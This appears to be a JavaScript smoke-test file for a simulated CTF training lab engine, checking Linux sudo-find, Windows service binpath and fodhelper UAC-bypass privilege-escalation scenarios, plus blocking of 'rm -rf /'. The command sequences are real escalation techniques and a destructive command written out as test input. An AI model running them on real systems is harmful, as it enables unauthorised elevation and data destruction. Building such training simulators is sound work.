const assert = require('assert');
process.env.SESSION_SECRET = 'ctfuz-arena-test-secret-32-chars-minimum';
const { LABS, executeLabCommand, expectedFlag } = require('../services/arenaLabEngine');

function run(slug, commands) {
  const lab = LABS[slug];
  let state = {
    connected: false, elevated: false, serviceConfigured: false,
    uacDefaultConfigured: false, uacDelegateConfigured: false,
    enumerated: false, exploitPrepared: false, cwd: '/home/trainee',
    objectivesCompleted: [false, false, false, false]
  };
  const results = [];
  for (const command of commands) {
    const result = executeLabCommand(lab, 'smoke-session-001', state, command);
    state = result.state;
    results.push(result);
  }
  return { state, results };
}

const linux = run('linux-privesc', [
  'ssh trainee@10.10.10.10', 'pwd', 'sudo -l', 'cd /usr/bin', 'pwd',
  'sudo find . -exec /bin/sh -p \\;', 'whoami', 'id', 'cat /root/root.txt'
]);
assert.strictEqual(linux.state.elevated, true, 'Linux find sudo scenario should elevate');
assert.strictEqual(linux.state.cwd, '/root', 'Linux working directory should persist in state');
assert.ok(linux.results.at(-1).output.startsWith('CTFUZ{'), 'Linux root flag should be readable after elevation');
assert.deepStrictEqual(linux.state.objectivesCompleted.slice(0, 3), [true, true, true]);
const afterExit = executeLabCommand(LABS['linux-privesc'], 'smoke-session-001', linux.state, 'exit');
assert.strictEqual(afterExit.state.connected, false, 'exit should close target shell');
assert.strictEqual(afterExit.state.objectivesCompleted[2], true, 'exit should not erase completed lab objectives');

const windows = run('windows-privesc', [
  'xfreerdp /v:10.10.20.10 /u:trainee', 'whoami /all', 'sc qc vulnsvc',
  'icacls "c:\\program files\\vulnsvc\\service.exe"',
  'sc config vulnsvc binpath= "C:\\Windows\\System32\\cmd.exe /c whoami"',
  'sc start vulnsvc', 'type c:\\programdata\\root.txt'
]);
assert.strictEqual(windows.state.elevated, true, 'Windows service scenario should elevate');
assert.ok(windows.results.at(-1).output.startsWith('CTFUZ{'), 'Windows root flag should be readable');
assert.strictEqual(windows.results[1].output.includes('PRIVILEGES INFORMATION'), true);
assert.strictEqual(windows.results[2].state.serviceInspected, true, 'sc qc must persist service inspection');
assert.strictEqual(windows.results[3].state.aclInspected, true, 'icacls must persist ACL inspection');
const windowsConnected = executeLabCommand(LABS['windows-privesc'], 'smoke-session-002', { connected: false, cwd: '/home/trainee', objectivesCompleted: [false, false, false, false] }, 'xfreerdp /v:10.10.20.10 /u:trainee').state;
const winCd = executeLabCommand(LABS['windows-privesc'], 'smoke-session-002', windowsConnected, 'cd desktop');
assert.strictEqual(winCd.state.cwd, 'C:\\Users\\trainee\\Desktop', 'Windows case-insensitive cd should navigate to Desktop');
assert.ok(executeLabCommand(LABS['windows-privesc'], 'smoke-session-002', winCd.state, 'dir').output.includes('readme.txt'));
const winBack = executeLabCommand(LABS['windows-privesc'], 'smoke-session-002', winCd.state, 'cd ..');
assert.strictEqual(winBack.state.cwd, 'C:\\Users\\trainee');
const winD = executeLabCommand(LABS['windows-privesc'], 'smoke-session-002', winBack.state, 'cd /d C:\\Program Files\\VulnSvc');
assert.strictEqual(winD.state.cwd, 'C:\\Program Files\\VulnSvc', 'cd /d must support an absolute Windows path with spaces');
const winHelp = executeLabCommand(LABS['windows-privesc'], 'smoke-session-001', windows.state, 'help');
assert.ok(winHelp.output.includes('Windows CMD'), 'help should switch to Windows command list after RDP');
assert.ok(executeLabCommand(LABS['windows-privesc'], 'smoke-session-001', windows.state, 'sc qc').output.includes('sc qc VulnSvc'));
assert.ok(executeLabCommand(LABS['windows-privesc'], 'smoke-session-001', windows.state, 'ip route').output.includes('ipconfig'));


const uac = run('uac-bypass', [
  'xfreerdp /v:10.10.30.10 /u:trainee', 'whoami /groups',
  'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d cmd.exe /f',
  'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /d "" /f',
  'start fodhelper.exe', 'type c:\\users\\administrator\\desktop\\flag.txt'
]);
assert.strictEqual(uac.state.elevated, true, 'UAC simulation should elevate');
assert.ok(uac.results.at(-1).output.startsWith('CTFUZ{'), 'UAC flag should be readable');
assert.ok(uac.results[2].state.objectivesCompleted[2] === false, 'UAC setup objective must wait for both registry values');
assert.ok(uac.results[3].state.objectivesCompleted[2] === true, 'UAC setup objective completes after both values');

const blocked = run('linux-privesc', ['ssh trainee@10.10.10.10', 'rm -rf /']);
assert.match(blocked.results.at(-1).output, /qo‘llab-quvvatlanmaydi/);
assert.strictEqual(expectedFlag('smoke-session-001', 'linux-privesc').startsWith('CTFUZ{'), true);

console.log('Arena Labs engine smoke tests: PASS (Linux, Windows CMD dialect, path navigation, service/ACL workflow, UAC, restricted command handling).');
